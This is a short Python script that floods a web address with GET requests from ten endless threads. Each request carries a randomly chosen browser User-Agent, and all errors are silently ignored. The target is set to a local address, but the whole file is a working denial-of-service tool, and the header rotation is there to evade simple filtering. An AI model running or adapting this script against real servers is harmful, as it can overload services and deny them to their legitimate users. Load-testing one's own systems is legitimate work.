import threading
import requests
import random
import time

url = "http://127.0.0.1:8000"

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
]

def attack():
    while True:
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            requests.get(url, headers=headers)
        except:
            pass
        time.sleep(0.1)

for _ in range(10):
    threading.Thread(target=attack, daemon=True).start()

while True:
    time.sleep(1)
